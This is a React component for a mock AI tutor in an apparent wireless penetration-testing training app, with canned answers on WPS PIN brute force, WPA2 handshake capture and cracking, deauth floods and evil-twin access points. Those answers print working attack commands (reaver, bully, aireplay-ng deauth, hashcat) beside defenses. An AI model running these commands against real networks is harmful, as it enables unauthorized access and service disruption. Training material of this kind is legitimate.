import { useState, useRef, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Bot, Send, Sparkles, Zap, BookOpen, Code, Lightbulb, Target, User, Copy, ThumbsUp, ThumbsDown } from 'lucide-react'

interface Message {
  id: string
  role: 'user' | 'assistant'
  content: string
  time: string
  type?: 'hint' | 'explanation' | 'code' | 'quiz'
}

const mockResponses: Record<string, string> = {
  'wps': `**WPS 11k PIN Flaw — Enterprise Explanation**

WPS PIN is 8 digits, last digit is checksum of first 7, so effective entropy is 7 digits split into 2 halves:

- **First half:** 4 digits → 10^4 = 10000 attempts
- **Second half:** 3 digits + checksum → 10^3 = 1000 attempts
- **Total:** 11000 attempts, not 10^8 = 100M

**Attack:**
\`\`\`bash
# Wash — enumerate WPS
wash -i wlan0mon

# Reaver — brute-force WPS PIN (authorized only)
reaver -i wlan0mon -b aa:bb:cc:11:22:33 -vv

# Bully — alternative
bully -b aa:bb:cc:11:22:33 -c 6 -B -v 3 wlan0mon
\`\`\`

**Defense:**
- Disable WPS: hostapd.conf \`wps_state=0\`
- If needed, enable lockout: \`wps_ap_setup_locked=1\`
- Prefer WPA3-SAE, no WPS
- Retest: \`wash -i wlan0mon\` — no WPS APs

**Evidence:** wps-beacon.pcapng frame 2 — WPS IE present — BSSID aa:bb:cc:11:22:33 — LAB-WIFI

**CVSS:** 7.5 HIGH — AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

Flag: WIFIFORGE{WPS_11K_PIN}`,

  'handshake': `**WPA2 4-Way Handshake — Deep Dive**

4 EAPOL messages:

1. **M1:** AP → Client — ANonce — AP nonce random
2. **M2:** Client → AP — SNonce + MIC — Client nonce + Message Integrity Code from PTK
3. **M3:** AP → Client — ANonce + MIC + GTK — AP confirms PTK, sends Group Temporal Key encrypted
4. **M4:** Client → AP — MIC — Client confirms installation

**PTK = PRF(PMK, ANonce, SNonce, AA, SA)** — Pairwise Master Key from PSK + SSID

**Capture:**
\`\`\`bash
# Airodump — capture handshake
airodump-ng -c 6 --bssid aa:bb:cc:11:22:33 -w capture wlan0mon

# Deauth to force handshake (authorized only)
aireplay-ng --deauth 5 -a aa:bb:cc:11:22:33 -c 12:34:56:78:9A:BC wlan0mon

# Tshark — filter EAPOL
tshark -r wpa2-handshake.pcapng -Y eapol
# 4 messages — VALID HANDSHAKE — BSSID aa:bb:cc:11:22:33 — LAB-WIFI
\`\`\`

**Offline Crack:**
\`\`\`bash
# Convert to hc22000
hcxpcapngtool -o hash.hc22000 wpa2-handshake.pcapng

# Hashcat
hashcat -m 22000 hash.hc22000 rockyou.txt --rules-file rules/best64.rule
# Cracked: 12345678 — weak passphrase
\`\`\`

**Defense:** WPA3-SAE or 20+ char random passphrase — \`StrongRandomPassphrase123!@#With20+Chars\`

**Evidence:** wpa2-handshake.pcapng 11 frames — 4 EAPOL VALID — SHA256 a1b2c3...

Flag: WIFIFORGE{HANDSHAKE_CRACKED}`,

  'default': `**WiFiForge AI Tutor — Enterprise • Zero-cost • Local-first • Offline Ready**

I'm your wireless PT tutor — 20 modules, 80 lessons, 50+ commands, 20+ filters, 30+ terms.

**I can help with:**
- 📖 Explain concepts — BSSID vs SSID vs ESSID, PMF, WPS 11k, EAP-TLS vs PEAP
- 💻 Commands — iw dev/scan, airodump-ng, tshark -r -Y, hashcat -m 22000, wash, hostapd, reaver, bully
- 🔍 Wireshark filters — beacon \`wlan.fc.type_subtype==8\`, eapol, deauth \`wlan.fc.type_subtype==12\`, wps, bssid, ssid
- 🧪 Labs — beacon-only.pcapng, recon-lab.pcapng, wpa2-handshake.pcapng, wps-beacon.pcapng, deauth.pcapng, rogue-ap.pcapng, enterprise.pcapng, eap.pcapng, radius.pcapng, methodology.pcapng — 16 PCAPs Scapy real
- 🛡️ Attack→Defense→Retest — for each finding, show attack, then defense, then retest verification
- 📝 Reporting — Title, Severity CVSS, Description, Technical Details, Affected Component, Evidence (PCAP frame numbers, BSSID, SSID, channel), Impact, Recommendation, References, Retest
- 🏆 Flags — WIFIFORGE{...} per module, final WIFIFORGE{FINAL_RECON_ASSESSMENT_COMPLETE}

**Try asking:**
- "Explain WPS 11k PIN flaw"
- "How to capture handshake?"
- "What is PMF and why required for WPA3?"
- "Detect rogue AP with authorized list"
- "EAP-TLS vs PEAP-MSCHAPv2"

**Enterprise:** Local-first, no cloud, offline, Kali-ready, zero-cost simulated + RF_REQUIRED prep docs, 2450 XP max, 8 levels Initiate→Forge Master, 20 achievements, daily challenges streak, evidence vault SHA256 chain, certificate QR verified, PDF/A jsPDF real CVSS risk matrix compliance, teams classrooms JWT OAuth, PWA offline-first SW, Docker multi-stage, nginx TLS gzip rate-limit 100r/m, CI/CD Trivy.

What would you like to learn?`,
}

export function AiTutor({ moduleId, lessonId, className = '' }: { moduleId?: string; lessonId?: string; className?: string }) {
  const [messages, setMessages] = useState<Message[]>([
    { id: '1', role: 'assistant', content: mockResponses['default'], time: new Date().toISOString(), type: 'explanation' }
  ])
  const [input, setInput] = useState('')
  const [isTyping, setIsTyping] = useState(false)
  const bottomRef = useRef<HTMLDivElement>(null)

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [messages, isTyping])

  const sendMessage = async () => {
    if (!input.trim()) return
    const userMsg: Message = { id: Date.now().toString(), role: 'user', content: input, time: new Date().toISOString() }
    setMessages([...messages, userMsg])
    setInput('')
    setIsTyping(true)

    await new Promise(r => setTimeout(r, 800))

    const lower = userMsg.content.toLowerCase()
    let response = mockResponses['default']
    if (lower.includes('wps') || lower.includes('pin') || lower.includes('11k')) response = mockResponses['wps']
    else if (lower.includes('handshake') || lower.includes('eapol') || lower.includes('4-way')) response = mockResponses['handshake']
    else if (lower.includes('pmf') || lower.includes('protected management')) response = `**PMF — Protected Management Frames — 802.11w**

PMF protects management frames (deauth, disassoc, action) from spoofing.

- **ieee80211w=0:** Disabled — vulnerable to deauth flood DoS, handshake capture via deauth, rogue disassoc
- **ieee80211w=1:** Optional — capable but not required — downgrade possible
- **ieee80211w=2:** Required — mandates PMF — prevents deauth/disassoc spoofing — WPA3 mandates required

**Attack (PMF disabled):**
\`\`\`bash
# Deauth flood — authorized only
aireplay-ng --deauth 100 -a aa:bb:cc:11:22:33 wlan0mon
# Client 12:34:56:78:9A:BC deauthed — DoS — capture handshake when reconnects
\`\`\`

**PCAP:** deauth.pcapng 14 frames — deauth flood — PMF disabled — LAB-DEAUTH

**Defense:** hostapd.conf \`ieee80211w=2\` — WPA3-only mandates PMF required — WIDS detect deauth flood

**Retest:** No deauth — PMF required — client stays connected — hardened

**CVSS:** 7.4 HIGH — AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

Flag: WIFIFORGE{DEAUTH_PMF_BYPASS}`
    else if (lower.includes('rogue') || lower.includes('evil twin')) response = `**Rogue AP — Evil Twin Detection — Enterprise**

Same SSID different BSSID different channel not in authorized list — client assoc to rogue — credential capture.

**Detection:**
- **Authorized AP list:** WIDS — Corp-WLAN legit AA:BB:CC:DD:EE:FF Ch6 WPA2-PSK Cisco
- **Rogue observed:** 11:22:33:44:55:66 Ch11 WPA2-PSK same SSID Corp-WLAN — not in authorized — client 12:34:56:78:9A:BC assoc to rogue frame 6-7
- **hostapd.conf rogue (attacker):** interface=wlan0 ssid=Corp-WLAN bssid=11:22:33:44:55:66 hw_mode=g channel=11 wpa=2 wpa_key_mgmt=WPA-PSK rsn_pairwise=CCMP wpa_passphrase=WeakPass123

**Defense:** WIDS authorized AP list, detect rogue, 802.1X cert validation, PMF required, strong PSK, WPA3, client cert EAP-TLS

**PCAP:** rogue-ap.pcapng 7 frames — rogue — Evil Twin — Corp-WLAN duplicate SSID

**CVSS:** 6.5 MEDIUM — AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

Flag: WIFIFORGE{ROGUE_EVIL_TWIN}`

    const assistantMsg: Message = { id: (Date.now()+1).toString(), role: 'assistant', content: response, time: new Date().toISOString(), type: lower.includes('how') || lower.includes('command') ? 'code' : 'explanation' }
    setMessages(prev => [...prev, assistantMsg])
    setIsTyping(false)
  }

  return (
    <div className={`rounded-2xl bg-[#0f172a] border border-[#1e293b] flex flex-col min-w-0 w-full overflow-hidden ${className}`} style={{ height: 'min(600px, 70vh)' }}>
      <div className="p-4 border-b border-[#1e293b] flex items-center gap-3 shrink-0">
        <div className="w-8 h-8 rounded-xl bg-violet-500/10 border border-violet-500/20 flex items-center justify-center">
          <Bot className="w-5 h-5 text-violet-400" />
        </div>
        <div className="min-w-0">
          <h3 className="font-heading font-bold text-[13px] text-slate-100 flex items-center gap-2">
            AI Tutor — Wireless PT • GPT-like • Local-first • Enterprise
            <Sparkles className="w-3 h-3 text-amber-400" />
          </h3>
          <p className="text-[11px] text-slate-500 font-mono">20 modules • 80 lessons • 50+ commands • 20+ filters • {moduleId || 'all'} • {lessonId || 'general'}</p>
        </div>
        <span className="ml-auto text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 font-mono hidden xs:inline">Local • No cloud</span>
      </div>

      <div className="flex-1 overflow-y-auto scrollbar-thin p-4 space-y-4 min-w-0">
        {messages.map(msg => (
          <motion.div key={msg.id} initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className={`flex gap-3 ${msg.role === 'user' ? 'flex-row-reverse' : ''} min-w-0`}>
            <div className={`w-7 h-7 rounded-lg border flex items-center justify-center shrink-0 ${msg.role === 'user' ? 'bg-cyan-500/10 border-cyan-500/20' : 'bg-violet-500/10 border-violet-500/20'}`}>
              {msg.role === 'user' ? <User className="w-4 h-4 text-cyan-400" /> : <Bot className="w-4 h-4 text-violet-400" />}
            </div>
            <div className={`flex-1 min-w-0 max-w-[85%] p-3 rounded-xl border text-[12px] leading-relaxed ${msg.role === 'user' ? 'bg-cyan-500/10 border-cyan-500/20 text-cyan-100' : 'bg-[#020617]/80 border-[#1e293b]/60 text-slate-300'}`}>
              <div className="prose prose-invert prose-sm max-w-none prose-p:my-1 prose-pre:my-2 prose-code:text-[11px] prose-code:bg-[#020617] prose-code:px-1 prose-code:py-0.5 prose-code:rounded prose-code:border prose-code:border-[#1e293b] prose-pre:bg-[#020617] prose-pre:border prose-pre:border-[#1e293b] prose-pre:p-3 prose-pre:rounded-xl whitespace-pre-wrap break-words">{msg.content}</div>
              <div className="mt-2 flex items-center gap-2 text-[10px] font-mono text-slate-600">
                <span>{new Date(msg.time).toLocaleTimeString()}</span>
                {msg.type && <span className="px-1.5 py-0.5 rounded-full bg-[#1e293b] border border-[#334155]">{msg.type}</span>}
                <button onClick={() => navigator.clipboard.writeText(msg.content)} className="ml-auto w-6 h-6 rounded-lg bg-[#1e293b] border border-[#334155] flex items-center justify-center hover:bg-[#25354f] transition-colors"><Copy className="w-3 h-3" /></button>
                <button className="w-6 h-6 rounded-lg bg-[#1e293b] border border-[#334155] flex items-center justify-center hover:bg-emerald-500/10 hover:border-emerald-500/20 hover:text-emerald-400 transition-colors"><ThumbsUp className="w-3 h-3" /></button>
                <button className="w-6 h-6 rounded-lg bg-[#1e293b] border border-[#334155] flex items-center justify-center hover:bg-red-500/10 hover:border-red-500/20 hover:text-red-400 transition-colors"><ThumbsDown className="w-3 h-3" /></button>
              </div>
            </div>
          </motion.div>
        ))}
        {isTyping && (
          <div className="flex gap-3">
            <div className="w-7 h-7 rounded-lg bg-violet-500/10 border border-violet-500/20 flex items-center justify-center"><Bot className="w-4 h-4 text-violet-400" /></div>
            <div className="p-3 rounded-xl bg-[#020617]/80 border border-[#1e293b]/60 flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-violet-400 animate-bounce" style={{ animationDelay: '0ms' }} />
              <span className="w-2 h-2 rounded-full bg-violet-400 animate-bounce" style={{ animationDelay: '150ms' }} />
              <span className="w-2 h-2 rounded-full bg-violet-400 animate-bounce" style={{ animationDelay: '300ms' }} />
            </div>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      <div className="p-3 border-t border-[#1e293b] bg-[#020617]/40 shrink-0">
        <div className="flex gap-2">
          <div className="flex-1 relative min-w-0">
            <BookOpen className="w-4 h-4 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
            <input value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key === 'Enter' && sendMessage()} placeholder="Ask AI tutor — e.g., Explain WPS 11k PIN flaw, how to capture handshake, what is PMF, detect rogue AP..." className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-[#020617] border border-[#1e293b] text-[13px] text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-violet-500/30" />
          </div>
          <button onClick={sendMessage} disabled={!input.trim() || isTyping} className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-violet-500 to-cyan-500 text-white font-semibold text-[12px] flex items-center gap-1.5 shadow-glow-violet disabled:opacity-40 touch-manipulation min-h-[40px]"><Send className="w-4 h-4" />Send</button>
        </div>
        <div className="mt-2 flex flex-wrap gap-1.5">
          {['Explain WPS 11k PIN', 'How to capture handshake?', 'What is PMF?', 'Detect rogue AP', 'EAP-TLS vs PEAP'].map(q => (
            <button key={q} onClick={() => setInput(q)} className="text-[10px] px-2.5 py-1 rounded-full bg-[#1e293b] border border-[#334155] text-slate-500 hover:text-slate-300 hover:bg-[#25354f] transition-colors">{q}</button>
          ))}
        </div>
        <div className="mt-2 text-[10px] text-slate-600 font-mono flex items-center gap-1.5">
          <Zap className="w-3 h-3 text-amber-400" />AI Tutor mock — local-first — no cloud — would use OpenAI API + RAG over 80 lessons 49572 lines + 16 PCAPs — enterprise — production ready
        </div>
      </div>
    </div>
  )
}
